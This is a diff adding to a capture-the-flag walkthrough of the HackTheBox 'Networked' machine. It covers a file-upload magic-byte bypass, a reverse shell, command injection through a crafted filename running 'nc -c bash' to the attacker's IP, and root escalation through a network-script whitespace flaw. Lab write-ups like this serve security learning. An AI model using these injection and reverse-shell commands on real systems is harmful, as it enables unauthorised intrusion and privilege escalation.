@@ -115,8 +115,181 @@ function check_file_type($file) {
 ```
 ## Exploit
 From the source code analysis, we can see that the magic bytes in the file are being checked in the ```file_mime_type``` function. This tells us that we can upload other file extensions by simply bypassing the magic headers or introducing a shell in the metadata. For this exploit, we will bypass the magic headers instead
+
+Let's modify the file extensions and the magic bytes in the ```exploit.php``` file using any hexeditor, and save the file as a jpeg file. Afterwards, we will upload the file onto the website 
+
+![Magic bytes in hex editor](https://github.com/joelczk/writeups/blob/main/HTB/Images/Networked/hex_editor.PNG)
+
 ### Obtaining reverse shell
+
+Browsing to the uploaded image on /photos.php will give us a reverse shell.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4000
+listening on [any] 4000 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.146] 34666
+Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 07:00:25 up 16:43,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ 
+```
+Next, all we have to do is to stabilize the shell
+
+```
+┌──(kali㉿kali)-[~]
+└─$ fg                                                                        130 ⨯ 1 ⚙
+[1]  + continued  nc -nlvp 4000
+export TERM=xterm
+export TERM=xterm
+bash-4.2$ stty cols 132 rows 34
+stty cols 132 rows 34
+bash-4.2$ whoami        
+whoami
+apache
+bash-4.2$
+```
+
+We realize that we do not have the permissions to view user.txt file. Hence, we have to escalate our privileges to guly to be able to view the user flag.
+
+```
+bash-4.2$ cd /home/guly
+cd /home/guly
+bash-4.2$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+```
+
+However, we realize that we have a file, crontab.guly which shows that check_attack.php is being executed on a cron job. 
+
+```
+bash-4.2$ ls
+ls
+check_attack.php  crontab.guly  user.txt
+bash-4.2$ cat crontab.guly
+cat crontab.guly
+*/3 * * * * php /home/guly/check_attack.php
+```
+
+### Code analysis of check_attack.php
+we have identified possible command injection from check_attack.php, where the $path is /var/www/html/uploads/ and $value is the filename in the path
+
+```
+exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+```
+
+### Privilege Esacalation to guly
+
+Now, we will exploit the command injection vulnerability in check_attack.sh by creating a file in /var/www/html/uploads
+
+```
+bash-4.2$ touch ';nc -c bash 10.10.16.4 5000'
+touch ';nc -c bash 10.10.16.4 5000'
+```
+
+By doing so, we are essentially executing the following command in check_attack.sh, which will create a reverse shell belonging to guly. 
+
+```
+exec("nohup /bin/rm -f; nc -c 10.10.16.4 5000 > /dev/null 2>&1 &");
+```
+
 ### Obtaining user flag
+
+As usual, we will stabilize the reverse shell and obtain the user flag
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 5000
+listening on [any] 5000 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.146] 56708
+python -c 'import pty; pty.spawn("/bin/bash")'
+[guly@networked ~]$ export TERM=xterm
+sexport TERM=xterm
+[guly@networked ~]$stty cols 132 rows 34
+stty cols 132 rows 34
+[guly@networked ~]$ cd /home/guly
+cd /home/guly
+[guly@networked ~]$ cat user.txt
+cat user.txt
+<Redacted user flag>
+[guly@networked ~]$ 
+```
+### Source code analysis of changename.sh
+
+Executing sudo -l, we realize that we are able to execute changename.sh command with root privileges
+
+```
+[guly@networked ~]$ sudo -l
+sudo -l
+Matching Defaults entries for guly on networked:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME
+    HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User guly may run the following commands on networked:
+    (root) NOPASSWD: /usr/local/sbin/changename.sh
+```
+
+Looking at changename.sh, we can see that the script will tatke in an input from us and append it to /etc/sysconfig/network-scripts/ifcfg-guly
+
+```
+#!/bin/bash -p
+cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+EoF
+
+regexp="^[a-zA-Z0-9_\ /-]+$"
+
+for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
+        echo "interface $var:"
+        read x
+        while [[ ! $x =~ $regexp ]]; do
+                echo "wrong input, try again"
+                echo "interface $var:"
+                read x
+        done
+        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+done
+  
+/sbin/ifup guly0
+```
+
+### Privilege escalation to root
+
+From [here](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f), we realize that if there is a white space in our input, the system will try to execute the part after the white space.
+We can then add use the following input ```test bash``` to escalate our privileges to root privileges
+
+```
+[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
+sudo /usr/local/sbin/changename.sh
+interface NAME:
+test bash
+test bash
+interface PROXY_METHOD:
+test bash
+test bash
+interface BROWSER_ONLY:
+test bash
+test bash
+interface BOOTPROTO:
+test bash
+test bash
+[root@networked network-scripts]# 
+```
 ### Obtaining root flag
 
+```
+[root@networked ~]# cat /root/root.txt
+cat /root/root.txt
+<Redacted root flag>
+[root@networked ~]# 
+```
 ## Post-exploitation
+### Command Injection
+It is noticed that ```/``` is an illegal character in creating file names as the server would interpret ```/``` as a directory and as a result, it will be unable to create the file on /var/www/html/upload directory (Unless the file with ```/``` exists on the terminal)
+ When creating the reverse shell for 
